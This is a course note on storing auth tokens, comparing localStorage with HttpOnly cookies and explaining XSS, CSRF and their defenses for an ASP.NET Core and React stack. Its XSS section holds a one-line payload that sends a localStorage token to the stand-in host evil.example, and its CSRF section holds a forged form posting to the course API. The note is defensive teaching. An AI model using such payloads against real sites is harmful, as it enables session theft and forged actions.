# Token Storage in Depth: Cookies, HttpOnly, XSS, and CSRF

## Learning Objectives
- Explain what a cookie actually is — the `Set-Cookie` header, the attributes (`HttpOnly`, `Secure`,
  `SameSite`, `Max-Age`), and the browser's auto-attach behavior.
- Define XSS and CSRF precisely, name which storage choice is exposed to which, and why.
- State the full `localStorage`-vs-HttpOnly-cookie trade-off, including the part most answers miss:
  `HttpOnly` stops token *theft*, not token *misuse*.
- Name the standard defenses on each side: output escaping and CSP for XSS; `SameSite`, anti-forgery
  tokens, and origin checks for CSRF.
- Sketch what switching our own stack (ASP.NET Core API + React SPA) to cookie auth would actually
  require, on both ends.

## Why This Matters
"Where do you store the JWT?" is one of the most reliable interview questions in front-end and
full-stack loops, and it is a trap for anyone who memorized a one-liner. "localStorage is insecure,
use cookies" fails the follow-up ("so cookies are safe?") just as fast as the reverse. The honest
answer is a trade: each storage choice closes one attack class and opens another, and the interviewer
is checking whether you know *which* attack, *why*, and *what the mitigation is*. This note is the
deep version of the trade-off the demo names out loud in `09-auth-context` Step 3 — our demo and P2
apps use `localStorage` and say so; here is everything behind that sentence. The client-side arc
itself lives in [client-auth-arc.md](client-auth-arc.md); this note zooms into one link of that
chain.

## The Concept

### (a) What a cookie actually is
A cookie is a small piece of state the **server** asks the browser to keep, via a response header:

```
Set-Cookie: library.auth=eyJhbGciOi...; HttpOnly; Secure; SameSite=Lax; Max-Age=3600; Path=/
```

From then on the browser attaches it **automatically** to every request whose URL matches the
cookie's scope — no JavaScript involved. That auto-attach is the whole personality of cookies: it is
what makes them convenient (nothing to wire up) and what makes them dangerous (they go along for the
ride whether the request was your idea or an attacker's).

The attributes are the security surface, and interviewers ask about them by name:

- **`HttpOnly`** — JavaScript cannot read this cookie. `document.cookie` will not show it. This is
  the anti-theft attribute: even a successful script injection cannot exfiltrate the value.
- **`Secure`** — only sent over HTTPS. (Browsers carve out `localhost` as trustworthy so local dev
  still works.)
- **`SameSite`** — controls whether the cookie rides along on **cross-site** requests. `Strict`
  never sends it cross-site; `Lax` (the modern browser default) sends it on top-level navigations
  (clicking a link) but not on cross-site `POST`s or background fetches; `None` always sends it and
  **requires `Secure`**. This attribute is the browser-level CSRF defense.
- **`Max-Age` / `Expires`** — lifetime. Without one, the cookie is a *session cookie* and dies with
  the browser.
- **`Path` / `Domain`** — which URLs it is attached to.

One nuance worth knowing because it bites in dev: `SameSite` compares **sites** (scheme + registrable
domain), and a site is not an origin — **the port is ignored**. A Vite app on `localhost:5173`
calling an API on `localhost:5137` is *cross-origin* (CORS applies) but **same-site** (`SameSite=Lax`
cookies still flow). Those are two different walls, enforced at two different layers.

### (b) XSS: the attack `localStorage` is exposed to
**Cross-Site Scripting** means an attacker gets *their* JavaScript to run in *your* page — through an
unescaped comment field, a compromised npm dependency, an injected ad script. Once any hostile script
runs in the page, it runs with the page's privileges, and `localStorage` is part of those privileges:

```js
// The entire heist, if the token lives in localStorage:
new Image().src = "https://evil.example/steal?t=" + localStorage.getItem("library.token");
```

One line, and the attacker now holds a valid bearer token they can replay from anywhere until it
expires. That is the exposure the demo names when it picks `localStorage`.

Defenses are about keeping hostile script out in the first place:
- **Escape output** — the framework's job, and React does it by default: `{userInput}` in JSX is
  rendered as text, not parsed as HTML. The escape hatch is literally named
  `dangerouslySetInnerHTML`; every use of it (and every direct `innerHTML` write in plain JS) is an
  XSS review point.
- **Content Security Policy (CSP)** — a response header that tells the browser which script sources
  are allowed to execute; a strong CSP turns many injections into console errors.
- **Dependency hygiene** — a compromised package ships attacker code *inside* your bundle, where no
  escaping helps. This is why supply-chain attacks target front-end packages: the payout is every
  user's session.

### (c) HttpOnly stops theft — not misuse
Move the token into an `HttpOnly` cookie and the one-liner above returns nothing: JavaScript cannot
read the cookie, so the token cannot be *exfiltrated*. This is the real security win, and it is worth
having.

But be precise, because this is the follow-up that separates candidates: an XSS payload running in
your page can still **call your API**, and the browser will helpfully attach the cookie to those
calls. The attacker cannot steal the credential, but they can *use* it — on-session, from inside the
victim's browser, for as long as the tab is open. `HttpOnly` narrows the blast radius from "token
replayable from anywhere until expiry" to "actions performed during the compromised session"; it
does not make XSS survivable. Nothing does — if hostile script runs in the page, the page is lost.
Storage choice decides what the attacker walks away with.

### (d) CSRF: the attack cookies are exposed to
**Cross-Site Request Forgery** is the mirror image, and it exists *because of* cookie auto-attach.
The attacker never runs script in your page and never sees the token. They simply get a logged-in
victim to visit `evil.example`, which contains:

```html
<form action="http://localhost:5137/api/Inventory/BOOK-001" method="POST">
  <!-- auto-submitted by a one-line script on the attacker's page -->
</form>
```

The browser sends the request to *your* API, and — auto-attach — sends the auth cookie with it. The
server sees a valid cookie and a well-formed request. This is called **ambient authority**: the
credential rides along regardless of who authored the request.

Now the key asymmetry, which is the actual answer to "why is localStorage CSRF-free": a bearer token
in `localStorage` is only attached when **your code** explicitly puts it in a header. The attacker's
page cannot read another origin's `localStorage` and cannot make your interceptor run. No auto-attach,
no CSRF. Each storage choice is immune to exactly the attack the other is exposed to.

Cookie-side CSRF defenses, in the order you reach for them:
- **`SameSite=Lax` or `Strict`** — the browser refuses to attach the cookie to cross-site `POST`s.
  `Lax` is the default in modern browsers and kills the classic auto-submitted-form attack outright.
- **Anti-forgery tokens** (a.k.a. CSRF tokens) — the server hands the page a secret the attacker's
  site cannot read; every state-changing request must echo it back in a header or field. ASP.NET
  Core ships this as the antiforgery services (`AddAntiforgery`, `[ValidateAntiForgeryToken]` in the
  MVC/Razor world). This is the defense-in-depth layer for when `SameSite` alone is not enough
  (older browsers, `SameSite=None` deployments).
- **Require a custom header** — a cross-site form cannot set `X-Requested-With` or send
  `Content-Type: application/json` without triggering a CORS preflight, which your API's CORS policy
  then refuses. A JSON-only API that rejects form content types gets a lot of this for free.
- **Check `Origin`/`Referer`** — a server-side sanity check that the request came from an allowed
  origin.

### (e) The trade-off, stated fully

| | `localStorage` + Bearer header | HttpOnly cookie |
|---|---|---|
| XSS: token theft | **Exposed** — one line exfiltrates it | **Immune** — JS cannot read it |
| XSS: on-session misuse | Exposed (attacker script can call the API) | Exposed (cookie auto-attaches) — theft blocked, misuse not |
| CSRF | **Immune** — nothing auto-attaches | **Exposed** — needs `SameSite` + anti-forgery |
| Client reads identity/claims | Decode the JWT payload in JS | Cannot — needs a `/auth/me` endpoint round-trip |
| Attach mechanism | Your code (one interceptor) | Browser (automatic; `withCredentials` for cross-origin) |
| Logout | Delete the key in JS | Server must expire the cookie (JS cannot delete `HttpOnly`) |
| CORS | Standard preflight for the `Authorization` header | Also needs `AllowCredentials()` server-side + exact origins |
| Non-browser clients (mobile, console, Postman-style tooling) | Same Bearer flow works everywhere | Cookie jar semantics; usually keep a Bearer path anyway |
| Survives refresh | Yes | Yes |

The defensible interview summary: **cookies with `HttpOnly` + `Secure` + `SameSite` are the stronger
default for browser-only apps**, because token theft is the higher-payout attack and CSRF has strong,
largely-free mitigations now that `SameSite=Lax` is the browser default. `localStorage` + Bearer is
common, simpler, uniform across client types, and acceptable when the XSS surface is tightly
controlled — which is the call our demo and P2 apps make, out loud. Large production systems often
sidestep the whole question with a **Backend-for-Frontend (BFF)**: the browser holds only a session
cookie to its own backend, and the JWT never enters the browser at all.

### (f) What switching our stack would actually take
Concretely, on our Week 6 API (`Library.ControllerApi`) and the Week 7 SPA — this is ASP.NET Core
territory, included here so the whole picture is in one place.

**Server, four changes.** First, login sets the cookie and returns the identity instead of the token
(the client will no longer be able to decode what it cannot see):

```csharp
[HttpPost("login")]
public async Task<ActionResult> Login(loginDto dto)
{
    var user = await _users.ValidateAsync(dto.Username, dto.Password);
    if (user is null) return Unauthorized(new { error = "bad credentials" });

    var token = _tokens.Issue(user.Username, user.Role);
    Response.Cookies.Append("library.auth", token, new CookieOptions
    {
        HttpOnly = true,
        Secure = true,                  // localhost is exempt, so dev still works
        SameSite = SameSiteMode.Lax,    // kills the classic CSRF form-post
        Expires = DateTimeOffset.UtcNow.AddHours(1),
    });
    return Ok(new { name = user.Username, role = user.Role });
}
```

Second, a logout endpoint — JavaScript cannot delete an `HttpOnly` cookie, so the server must:

```csharp
[HttpPost("logout")]
public ActionResult Logout()
{
    Response.Cookies.Delete("library.auth");
    return NoContent();
}
```

Third, the JWT bearer middleware only reads the `Authorization` header; teach it to fall back to the
cookie (keeping the header path so Swagger and non-browser clients still work):

```csharp
.AddJwtBearer(o =>
{
    o.TokenValidationParameters = /* unchanged */;
    o.Events = new JwtBearerEvents
    {
        OnMessageReceived = ctx =>
        {
            if (string.IsNullOrEmpty(ctx.Request.Headers.Authorization))
                ctx.Token = ctx.Request.Cookies["library.auth"];
            return Task.CompletedTask;
        }
    };
});
```

Fourth, CORS: a credentialed cross-origin request requires `.AllowCredentials()` on the policy — and
ASP.NET will refuse at startup to combine that with `AllowAnyOrigin()`, which is the framework
forcing you to enumerate origins exactly (our policy already does).

**Client, three changes.** `axios.create({ baseURL, withCredentials: true })` replaces the entire
Bearer interceptor; the `storage.ts` and `jwt.ts` files are deleted (no token to store or decode);
and identity now comes from the server — login returns `{ name, role }`, and rehydrating on refresh
becomes a `GET /auth/me` round-trip instead of a synchronous `localStorage` read, which means the
auth reducer needs a "restoring" state so the route guard does not bounce a logged-in user while the
request is in flight.

Count the moving parts: that is why "just use an HttpOnly cookie" is a bigger sentence than it
sounds, and why the decision belongs at the start of a project rather than mid-sprint.

## Say It in an Interview
- *"It's a trade, not a right answer. `localStorage` is readable by any script on the page, so XSS
  can steal the token — but nothing auto-attaches it, so CSRF is moot. An HttpOnly cookie is
  unreadable by JavaScript, so theft is off the table — but the browser auto-attaches it, so CSRF
  becomes the concern, mitigated with `SameSite` and anti-forgery tokens."*
- *"The nuance most people miss: `HttpOnly` prevents token *theft*, not token *misuse*. Script
  injected by XSS can still call the API and the cookie rides along. It narrows the blast radius
  from 'replayable token' to 'on-session actions' — the real XSS fix is escaping and CSP, and React
  escapes by default unless you use `dangerouslySetInnerHTML`."*
- *"CSRF exists because of ambient authority — cookies ride on any request to their site, even one
  forged by another origin. `SameSite=Lax` is the modern browser default and blocks the classic
  cross-site form post; anti-forgery tokens are the defense-in-depth layer."*
- *"With cookie auth the client can't decode claims anymore, so identity comes from a `/auth/me`
  endpoint, logout has to happen server-side, and CORS needs `AllowCredentials` with exact origins.
  For browser-only apps I'd default to the cookie; for mixed clients, Bearer — and a BFF avoids
  putting the token in the browser at all."*

## Check Yourself
1. What does the `HttpOnly` attribute do, and what attack does it neutralize? What attack does it
   *not* neutralize, even against XSS?
2. Why is a token in `localStorage` immune to CSRF?
3. `SameSite=Lax` is set on the auth cookie. An attacker's page auto-submits a `POST` form at your
   API. What happens, and why?
4. Your Vite app on `localhost:5173` calls the API on `localhost:5137` with cookie auth. Is that
   cross-origin? Is it cross-site? Which walls apply?
5. After switching to HttpOnly-cookie auth, the SPA can no longer show "signed in as ada (admin)"
   from the token. Where does that information come from now, and what new UI state does the switch
   force on the client?
6. Why does the "sign out" button need a server endpoint under cookie auth?
7. Why will ASP.NET Core refuse `AllowAnyOrigin()` + `AllowCredentials()` in one CORS policy?

**Answers:** (1) The browser hides the cookie from JavaScript — `document.cookie` cannot see it — so
an XSS payload cannot *exfiltrate* the token. It does not stop *misuse*: injected script can still
call the API from the victim's browser and the cookie auto-attaches. (2) Nothing attaches it
automatically — only your own code puts it in the `Authorization` header, and another origin's page
can neither read your `localStorage` nor run your interceptor. No ambient authority, no CSRF.
(3) The browser refuses to attach the cookie: `Lax` sends cookies on top-level navigations but not
on cross-site `POST`s, so the forged request arrives unauthenticated and the API returns 401.
(4) Cross-origin yes (ports differ, so CORS applies — preflights, allowed origins). Cross-site no
(`SameSite` compares scheme + registrable domain and ignores the port), so `SameSite=Lax` cookies
still flow. Two different walls at two different layers. (5) From the server — the login response
body and a `GET /auth/me` endpoint read from the validated claims. Refresh-rehydration becomes an
async HTTP call, so the client needs a "restoring" auth state to keep the route guard from bouncing
a signed-in user mid-request. (6) JavaScript cannot delete an `HttpOnly` cookie; only a `Set-Cookie`
from the server (delete/expire) removes it. Client-only "logout" would leave the credential live.
(7) A wildcard origin plus credentials would let *any* site make authenticated requests carrying the
user's cookie — CSRF as a config option. The spec forbids it and ASP.NET enforces the ban at
startup, forcing an explicit origin list.

## Summary
- A cookie is server-set state the browser attaches automatically; `HttpOnly`, `Secure`, and
  `SameSite` are the attributes that make it a defensible token home.
- XSS = hostile script in your page; it can read `localStorage` in one line. React's default JSX
  escaping and CSP are the real defenses; `dangerouslySetInnerHTML` is the review point.
- `HttpOnly` blocks token theft but not on-session misuse — precision here is what interviewers are
  listening for.
- CSRF = ambient authority abused; it applies to cookies, never to hand-attached Bearer tokens.
  `SameSite=Lax` (now the browser default) plus anti-forgery tokens are the standard answer.
- Cookies and `localStorage` are each immune to exactly the attack the other is exposed to; cookies
  are the stronger browser-only default, Bearer is simpler and uniform across client types, and a
  BFF keeps the token out of the browser entirely.
- Switching our stack would touch both ends: cookie-setting login + logout endpoint +
  `OnMessageReceived` cookie fallback + `AllowCredentials` on the server; `withCredentials`, no
  decode, `/auth/me` rehydration, and a "restoring" state on the client.

## Resources
- [Using HTTP cookies — MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [Cross-Site Scripting Prevention Cheat Sheet — OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Cross-Site Request Forgery Prevention Cheat Sheet — OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Prevent Cross-Site Request Forgery (XSRF/CSRF) in ASP.NET Core — Microsoft Learn](https://learn.microsoft.com/en-us/aspnet/core/security/anti-request-forgery)
